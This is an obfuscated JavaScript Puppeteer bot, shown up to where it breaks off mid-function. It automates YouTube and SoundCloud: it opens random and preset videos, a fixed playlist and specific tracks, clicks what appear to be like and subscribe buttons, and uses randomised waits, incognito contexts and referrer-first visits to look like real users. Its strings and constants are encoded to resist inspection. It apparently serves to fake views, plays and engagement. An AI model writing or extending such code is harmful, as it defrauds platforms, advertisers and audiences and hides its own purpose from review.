const a1 = b,
  a0 = d,
  Z = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x11d9 + 0x8 * 0x3dd + -0xd0e))) + i;
}

function a() {
  const bp = [
    'nSk/W5TdAq9jsgal',
    'm\x20video...',
    'zgL1Bs5JB20VyG',
    'DcXTAw5Ly3jHzG',
    'Ahr0Chm6lY93DW',
    'Smile_Redi',
    'rmo2W7XloG',
    'Coming_Soo',
    'Eb/dTCkBW4tcTaddQ8o9AG',
    'uw1lD25sAuTOra',
    'WQRcVvJcIf85lKvabW',
    'lxbYB2PLy3rZlq',
    'that-knew-',
    'DgLUDwvKig1PBG',
    '3KoZGQiY6N',
    'q8o8D0DeW5G',
    'lwjLy29Tzs1WCG',
    'yNrZigz1DhvYzq',
    'W4/cVSoIWRzsWOT9WRCvW4e',
    'W41sW60wWPOawSkoW7FdMq',
    'W69pfdbTWPa',
    'EmkDWQVcGte',
    'm8opwmkiW7vaW6ddRSoYWQq',
    'C3rYAw5N',
    'ChrZl2j5lxnPDa'
  ];
  a = function() {
    return bp;
  };
  return a();
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0xe70 + -0x7 * 0x24f + 0x45f * 0x7), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x6cc * -0x1d + -0x8f9e * 0x1 + 0x2 * 0xe4f5 + (-0x3419 + -0x2d8f * 0x1 + 0x3e8 * 0x28) * random()) : await standardWaitForNetIdle(f), await wait(-0xa * -0xf1 + -0x67 * 0x61 + -0x1 * -0x3125 + (-0x18e * -0x16 + -0x396b + 0x3e47) * random()), -0x35 * 0x7a + 0x107 * 0xa + -0x4ff * -0x3;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x233d + -0x1 * 0x25bf + 0x160a), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x17dd + -0x1b2c + 0x330a;
}
async function randomWait() {
  return await wait(-0x10f * -0x11 + 0x64a + -0x4c1 + (0x26b2 + -0x22bd + -0x3 * -0x531) * random()), 0xb * 0x7 + 0x589 * -0x3 + -0x1 * -0x104f;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x21f + -0xb29 + 0x90a, 0x2655 * -0x1 + 0x4a2 * -0x2 + 0x2fa0), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x7d * 0x3e + -0x10357 + -0x3 * -0x9a7b) * getRandomInt(-0x1e30 + 0xe6f + 0xfc3, 0x10bd + 0xf71 + -0x2029), h)), -0x1536 + 0x29f * -0x4 + 0x1fb3;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x43 * -0x2f + -0xc5a + 0xd;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x56b + -0x4aa + -0xa16 * -0x1]['split']('\x20');
    for (let k = 0xd99 + 0x26ca + 0x1 * -0x3463; k < i['length']; k += -0x1198 + 0x10ef + 0xab)
      j += i[k] * h[i[k + (-0x195 + -0x1aa4 + 0x1c3a)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1 * -0x1aeb + -0x2 * 0x310 + 0x2111)['map'](l => Array['from'](l['children']))['flat'](0x1 * 0x20e3 + -0x5 * -0x455 + -0x368b)['map'](l => l['childNodes'][0xe93 + -0x2536 + 0x16a4]['childNodes'][0x11 * 0x28 + 0x2f2 * -0x4 + 0x920]['childNodes'][0x242e + 0xe3e * -0x1 + 0x1 * -0x15ef]['childNodes'][-0xf54 + -0x1112 + 0x8f * 0x3a]['childNodes'][-0x1261 + 0x22c * 0xb + -0x582]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0xddf + -0x213 + -0x7e4, -0x17d * -0x2 + 0x1caa + 0x14 * -0x9b)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x1 * 0x55c4 + -0x9 * 0xc2d + 0x5269);
  const h = await getMaxTime(f),
    i = Math['min']((-0xa2b9 + 0x179ea + 0x132f) * getRandomInt(-0x1906 + -0xe0 * -0x1 + 0x1828 * 0x1, -0x1 * -0x218f + 0x1f1 * -0x9 + -0x1011), h);
  return await wait(i), 0x2 * -0x1a + 0x2 * -0xe05 + 0x1c3f * 0x1;
}
async function frontScreenActions(f) {
  const R = d;
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + R(0x1)), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x3dd + 0x14f5 + -0x18d2]['children'][-0x4f * 0x3f + 0x13ce + 0x3 * -0x1f]['children'][0x654 + 0x1 * -0x3bc + -0x298]['children'][-0xf0f * 0x1 + 0x5ca + 0x945]['children'][0x1196 + -0x1c * -0x125 + -0x31a2]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x2405 + 0x1dca + -0x2 * 0x20e7;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x28b + -0x1a85 + 0x17fa);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x7b * 0x2d + -0x5 * 0x14 + -0x14d7 + (0x2583 * 0x1 + -0xe * 0x1d0 + -0xbf1) * random()
  }), await wait(0x20da + -0x49 * -0x20 + -0x6d * 0x5e + (-0xbda + 0x925 * 0x4 + -0x178e) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const S = b;
    if (!await f['evaluate'](() => Array['from'](document['getElement' + S(0x8, 'quLZ')]('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x125 * 0xb + 0x1 * 0x23ef + -0x1756]['childNodes'][-0x1c76 + 0x1187 + -0x10 * -0xaf]['childNodes'][-0x20d3 + -0x1034 + 0x3108]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1 * -0x1d99 + 0x94f * -0x1 + 0x26ed]['childNodes'][-0x8e2 * -0x2 + 0x2276 + -0x343a]['childNodes'][0x1c7f + 0x1 * 0x2 + -0x1c7f]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1f7a + -0xc64 + -0x3fd * -0xb),
          r = -0x143b * 0x1 + -0xf7f * -0x2 + -0x5 * 0x227;
        for (let u = 0x17bf * 0x1 + 0x146e + -0x2c2d; u < q['length']; u += 0x5e6 + 0x5be + -0xba2)
          r += q[u] * k[q[u + (-0x2 * 0x11a4 + -0x4db * 0x1 + 0x2824)]];
        return r;
      }(n);
  });
  await wait((0x2ef2 + -0x548f + 0x6035) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x13520 + -0x2 * -0xc08b + -0x67a * 0x47) * getRandomInt(-0x11c3 * -0x2 + 0x159c + -0x3921, 0xb * -0x1f0 + -0x24e7 * 0x1 + 0x3a41), h + (0xc14 * -0x1 + 0x4a9 * 0x1 + 0x1af3));
  return await wait(i), -0x1b07 + -0x1 * -0x113f + 0x9c9;
}
async function keyWatch(f) {
  const T = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, T(0x4) + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1d97 + -0x1f06 + 0x1 * 0x16f), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x73 * 0x2d + -0x1 * 0x1a3f + 0x3a2e + (0x1 * 0x2222 + -0xe57 * -0x1 + -0x2c91) * Math['random']());
    });
  }, -0xd63 * 0x2 + -0xb * -0x3b9 + 0xd2b);
  await wait(0x5 * 0x1bca6 + 0x1f83 * -0x39 + -0x2e8cd * -0x1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x3d1a + -0x182d7 + -0xdf * -0x283) * getRandomInt(0x5ad * 0x5 + 0x29 * 0x8d + 0x1979 * -0x2, 0x1731 + -0xca5 * -0x1 + -0x23bd)), clearInterval(h), 0x238b * 0x1 + 0x10 * 0x1e2 + -0xcd * 0x52;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x135b + 0x1f7b * 0x1 + -0x32d6;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x2 * -0x105b + -0x1 * -0xc53 + -0xb * 0x418;
    await randomWait();
  }
  return -0x1 * -0x3c1 + 0x1bf * 0x3 + -0x8fd;
}

function fetchRandomSC() {
  const U = b;
  return Math['random']() <= -0x1 * 0xcb + 0x63b * 0x4 + 0xd5 * -0x1d + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xb1f + 0x11a1 + -0x22 * 0x31 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + U(0xa, 'hEgz') + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x28b + -0x1a85 + 0x17fa);
    let h = e[f];
    if (b['GQpsgO'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x845 * -0x2 + -0x4e4 * -0x7 + -0x32c6, s, t, u = 0x1dd9 + 0x4e * -0x9 + -0x1b * 0x101; t = n['charAt'](u++); ~t && (s = r % (0x8 * 0x3dd + -0x1bc3 + -0x321) ? s * (-0x7 * 0x24f + 0x1fb5 * -0x1 + 0x301e) + t : t, r++ % (0x10 * -0x17f + 0xd00 + 0x2 * 0x57a)) ? p += String['fromCharCode'](-0x115e + -0x798 * 0x2 + 0x4cb * 0x7 & s >> (-(-0xa * -0xf1 + -0x67 * 0x61 + -0x1 * -0x1d9f) * r & -0xc7 * -0x16 + -0x1cb5 + 0xba1)) : -0x35 * 0x7a + 0x107 * 0xa + -0x112 * -0xe) {
          t = o['indexOf'](t);
        }
        for (let v = 0x233d + -0x1 * 0x25bf + 0x282, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x17dd + -0x1b2c + 0x3319))['slice'](-(-0x10f * -0x11 + 0x64a + -0x1847));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x26b2 + -0x22bd + -0x1 * 0x3f5,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xb * 0x7 + 0x589 * -0x3 + -0x1 * -0x104e; u < 0x21f + -0xb29 + 0xa0a; u++) {
          p[u] = u;
        }
        for (u = 0x2655 * -0x1 + 0x4a2 * -0x2 + 0x2f99; u < 0x22 * 0x13 + -0x159d + -0x1 * -0x1417; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1e30 + 0xe6f + 0x10c1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x10bd + 0xf71 + -0x202e, q = -0x1536 + 0x29f * -0x4 + 0x1fb2;
        for (let v = -0x43 * -0x2f + -0xc5a + 0xd; v < n['length']; v++) {
          u = (u + (-0x56b + -0x4aa + -0xa16 * -0x1)) % (0xd99 + 0x26ca + 0x1 * -0x3363), q = (q + p[u]) % (-0x1198 + 0x10ef + 0x1a9), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x195 + -0x1aa4 + 0x1d39)]);
        }
        return t;
      };
      b['vTaHyv'] = m, c = arguments, b['GQpsgO'] = !![];
    }
    const j = e[0x1 * -0x1aeb + -0x2 * 0x310 + 0x210b],
      k = f + j,
      l = c[k];
    return !l ? (b['DTdAUg'] === undefined && (b['DTdAUg'] = !![]), h = b['vTaHyv'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function runGFModule(f, h) {
  async function i() {
    const V = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x2600 + -0x2 * 0xce3 + -0x1fe3 * -0x2 + 0.3) {
      const j = await f[V(0x13, '#DjY') + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1cd3 + -0x1272 + -0xa61;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x6d62 + 0x4 * 0x44fb + -0xd186 + getRandomInt(0x182 * 0x13 + -0x5872 + -0x7664 * -0x1, 0x1 * 0xb230 + -0x1 * 0x7647 + 0x3947));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1 * -0x2425 + -0xa3c + 0x2e62), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x144a + -0x1 * -0x1941 + -0x2d8b;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x154d + -0x61 * 0x47 + 0x59a, 0x78b * -0x3 + -0x313 * -0xc + 0xd * -0x115)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1 * -0x1318 + -0xc5b + 0x113 + floor((0x25b3 + -0x2 * -0x45 + -0x2255) * random()))), log('p2'), log(await s['evaluate'](() => {
        const Y = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x6f0f4dab * -0x2 + -0x4f7c97ac + -0x75101d5 * 0x2),
          -0xeca2be + -0x775 * -0x182f + 0xb84c43,
          0x2e3 * 0x53 + 0x90e5 + 0x803f * -0x2,
          0x1fbb + -0x17 * -0x9d + -0x2d56
        ], y = [
          -0x24c4 + -0xb3 * 0x22 + -0x255 * -0x1a,
          0x1 * 0x301 + -0x2042 + 0x1d51,
          0x5 * 0x59d + -0x97 * -0x2f + -0x37c2,
          0x1368 + 0x3 * 0x2 + 0x6 * -0x33d
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xb17 + 0xa * 0x347 + -0x2 * 0x15ee)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x260a + 0x52 * -0x40 + -0x118a; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const W = c;
              if (W(0x17) == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0xcd2 + 0xc3e + -0x1910) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const X = b;
              J ? (A[-0x867 * 0x4 + -0x2199 + 0x4335] = A[0x11ec + 0x2077 * -0x1 + 0xe9b * 0x1] = A[0xcbf + -0x1127 + 0x469] = A[0x16aa + -0x86 * -0x4a + -0x2 * 0x1eb2] = A[0x15a7 + 0x1ff7 + -0x359b] = A[-0x2160 + 0x4 * 0x4c6 + 0xe4c] = A[0x2f9 * 0xb + -0x22e6 * -0x1 + 0x5 * -0xd84] = A[0x1add + -0x2400 + 0x929] = A[0x22e6 * 0x1 + -0x1a4 + -0x213b] = A[0xc8 * -0x8 + 0xccf + -0x687] = A[0xdf4 * -0x1 + -0x957 * -0x3 + 0x1c1 * -0x8] = A[-0x17ee + 0x2254 + -0x27 * 0x44] = A[0xa4f + -0x2 * 0x303 + -0x43e] = A[0x9a7 + -0x2619 * 0x1 + 0x1c7e] = A[0x3 * 0x3ff + 0x1609 + 0x21f9 * -0x1] = A[0x194 + 0x1 * -0x207d + 0x1ef7] = A[0x1535 + 0x2ad * -0x4 + -0xa72] = -0x899 + 0x13ef + 0x2 * -0x5ab, this['blocks'] = A) : this['blocks'] = [
                0x1 * 0x1bfe + 0x4 * -0x1f3 + 0xa * -0x205,
                0xcd1 + 0x2355 + -0x1813 * 0x2,
                0x15df + -0x266a + -0x108b * -0x1,
                0x3 * -0xa7f + -0x2116 + 0x4093,
                0xc7a * -0x1 + -0x3e0 * 0x2 + 0x143a,
                0x1 * 0x1a9e + -0x3 * -0x14e + -0x1e88,
                -0x115e + -0x6d * 0x2b + 0x23ad,
                -0xf62 + -0xc2f * 0x1 + -0x1b91 * -0x1,
                0xf52 + -0x123 * -0x17 + -0xc1 * 0x37,
                0x15d8 + -0x19ee * 0x1 + 0x416,
                -0x1366 * 0x2 + -0x102 * -0x14 + 0x4a9 * 0x4,
                0x20fb + 0x243f * 0x1 + 0x453a * -0x1,
                0x214f + 0x965 * 0x1 + 0x71e * -0x6,
                -0x2373 + -0x2231 * 0x1 + 0x45a4,
                0x1305 + -0x1be * -0x1 + -0x14c3,
                -0x1031 * -0x1 + -0x1 * -0x22ad + 0x11 * -0x2fe,
                -0x229b + -0x2 * -0x3d7 + 0x3d * 0x71
              ], this['h0'] = 0x13c33c66 + 0x61701aac + -0x1 * 0xdee3411, this['h1'] = 0x51086237 + -0x10ae5960f + 0x5 * 0x55222cad, this['h2'] = -0x12fe88f11 + 0x77c1 * 0x16b08 + -0x341c87 * -0x581, this['h3'] = -0x1b * -0x11e1eb + 0x30d78f1 * 0x1 + 0xb4207bc * 0x1, this['h4'] = 0x1c3a1 * -0x6b84 + 0x69efa1 * -0xca + -0x1 * -0x1d51720fe, this['block'] = this['start'] = this['bytes'] = this[X(0xf, 'WJ&5')] = 0x42 * -0x68 + 0x1980 + 0x150, this['finalized'] = this['hashed'] = 0xb01 * 0x1 + 0x4 * -0x2b + -0x17 * 0x73, this['first'] = 0x1d * 0x97 + -0x517 + 0x3 * -0x401;
            }
            [Y(0x14, 'EOJ(')](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x2f0 + 0x18a0 + -0x1b90, O = J['length'] || 0x14f0 + 0x23cc + 0x1 * -0x38bc, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1 * -0xd13 + -0x2026 * 0x1 + -0x2a9 * -0x11, P[0x1 * 0xbc0 + -0x1c9b + 0x5 * 0x35f] = this['block'], P[-0x337 + -0x1292 + 0x15d9] = P[0x21f5 + -0x1c13 + -0x5e1] = P[-0x1794 + -0x1dec + 0x1ac1 * 0x2] = P[0x2f * 0xa3 + -0x87 * -0x43 + 0x1 * -0x413f] = P[0x2656 + 0x9 * -0x24d + -0x119d] = P[0x1931 + 0x5 * 0x2fe + -0x2822] = P[-0x181d + -0x73 * -0x52 + -0xcb3] = P[0xa95 + 0x7f6 * 0x4 + -0x2a66] = P[-0x547 + -0x47e + 0x9cd] = P[0xd01 * -0x3 + 0x3ab + 0x3 * 0xbcb] = P[0x13af + -0xbf6 * -0x1 + -0x383 * 0x9] = P[-0x1 * -0x287 + 0x2 * -0x775 + 0xc6e] = P[-0x3b * -0x6 + -0x1c * -0xc4 + 0x6a * -0x37] = P[-0x1bb * 0x8 + 0x1446 + -0x661] = P[0x79e + 0x86b * 0x3 + -0x20d1] = P[0x98f * 0x4 + -0x1b0f + -0xb1e * 0x1] = -0x1a5a + -0xd * 0x5d + 0x637 * 0x5), K) {
                    for (N = this['start']; M < O && N < 0x2 * -0xb24 + -0xcbb * 0x2 + 0x2ffe; ++M)
                      P[N >> -0x17b2 + 0x1 * 0x1876 + -0xc2] |= J[M] << y[-0x1310 + -0x1af + 0x14c2 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2 * -0x687 + 0x2 * 0xfa7 + 0x2c1c * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0x2444 * -0x1 + -0x92 * 0x13 + 0x2f9a ? P[N >> -0x6fe + 0x1 * 0x12e5 + 0x5 * -0x261] |= L << y[0x1589 * -0x1 + -0x1d16 + 0x32a2 & N++] : L < 0x145c + 0xd2a + -0x1986 ? (P[N >> 0x6 * -0x163 + -0x30e + 0xb62] |= (-0x7b1 + 0x19 * -0x6e + -0x3 * -0x665 | L >> 0x1590 + 0x144d + -0x29d7) << y[-0xc0e + -0x1 * -0x15f6 + -0x9e5 & N++], P[N >> -0x2316 + 0x3 * -0x8cb + 0x3d79] |= (-0x955 * -0x2 + 0x1 * 0x6d7 + -0x1901 | -0x115c * 0x2 + -0xeb * -0x5 + 0x1e60 & L) << y[-0xa * -0x1a9 + 0xaa + 0x7 * -0x277 & N++]) : L < -0xc39f + -0x23f3 * 0x4 + -0x22b6b * -0x1 || L >= 0x1d * 0xbe4 + 0x19c41 + -0x1 * 0x21515 ? (P[N >> -0xfcf + 0x8dc + -0x89 * -0xd] |= (0x25ec * -0x1 + 0x194c + -0x4 * -0x360 | L >> -0x144f * 0x1 + -0x11 * -0xd + 0x137e) << y[-0x15f2 * 0x1 + 0x1b * -0x77 + 0x4ee * 0x7 & N++], P[N >> 0x1377 + 0xf1 * -0x3 + 0x1 * -0x10a2] |= (0xc * 0xa3 + 0x3 * 0x7cd + -0x45d * 0x7 | L >> 0x1bac + -0x26a + 0x286 * -0xa & 0xffb + 0x2628 + 0x1 * -0x35e4) << y[-0x65 * 0x29 + -0x1 * -0x18a3 + -0x873 & N++], P[N >> -0x926 + 0xba * 0x14 + -0x560] |= (0x2 * 0x12fb + -0xcde + -0x1898 | 0xf98 + -0x2273 + -0x1e9 * -0xa & L) << y[0xf9 * -0x1a + -0x1921 + 0x326e & N++]) : (L = -0xccb1 * -0x1 + -0x2bc8 + 0x8a5 * 0xb + ((0x2f1 * -0xa + 0x196f + 0x2 * 0x3fd & L) << -0x24e1 + 0x417 * 0x1 + 0x20d4 | -0x5 * 0xda + -0x2435 + 0x65a * 0x7 & J['charCodeAt'](++M)), P[N >> 0x13d0 + -0x186 + 0x1248 * -0x1] |= (-0xd09 + 0x1 * -0x20ba + 0x2eb3 | L >> -0x14eb + 0xc * -0x1a1 + 0x1 * 0x2889) << y[-0x25e3 + -0x4d5 * 0x8 + 0x29 * 0x1de & N++], P[N >> 0x2208 + -0x19b7 + 0x84f * -0x1] |= (0x7 * -0x1a1 + -0x2cf * 0x1 + -0x7 * -0x21a | L >> -0xa5c + 0x6f7 * -0x2 + -0x37a * -0x7 & -0xd67 + -0xac7 + 0x25 * 0xa9) << y[0x1 * 0x11b + 0xfb6 + -0x10ce & N++], P[N >> 0x1 * -0x1525 + -0x23a0 + -0x357 * -0x11] |= (-0x1 * 0xeb5 + -0xb4b * 0x1 + 0x1a80 | L >> 0x1 * -0x2197 + 0x1 * 0x4 + 0x2199 & -0x191 + -0x2 * -0xff0 + 0x1 * -0x1e10) << y[0x1b41 + 0xae + -0x1bec & N++], P[N >> -0x23d4 + 0x1bd + 0x1d * 0x12d] |= (-0xbf9 + 0xcb7 + 0x2 * -0x1f | 0x609 + 0xe8 * -0x1 + 0x5 * -0xfa & L) << y[-0x2a6 * 0x8 + 0x7 * 0x57e + 0x113f * -0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x2556 + -0xe1d + -0x16f9 ? (this['block'] = P[-0x72e * -0x2 + 0x1 * 0x1f46 + -0x2d92], this['start'] = N - (-0x1 * 0x2079 + 0xca3 + 0x3 * 0x6b2), this['hash'](), this['hashed'] = 0xf46 + 0x102c + -0x1f71) : this['start'] = N;
                }
